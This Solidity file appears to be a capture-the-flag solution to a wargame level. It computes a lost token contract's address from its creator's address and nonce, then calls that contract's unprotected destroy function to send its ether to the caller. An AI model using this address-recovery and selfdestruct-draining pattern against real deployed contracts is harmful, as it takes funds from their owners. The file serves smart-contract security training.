//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "./Recovery.sol";

contract hackRecovery {
    address internal creator = 0xDa9648B49f2B75AeA92a2D01F9A25DD406BA6e05;
    SimpleToken lostcontract;

    function hack() public {
        address _address = msg.sender;
        address _token = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(creator), bytes1(0x01))))));
        lostcontract = SimpleToken(payable(_token));
        
        lostcontract.destroy(payable(_address));
    }
}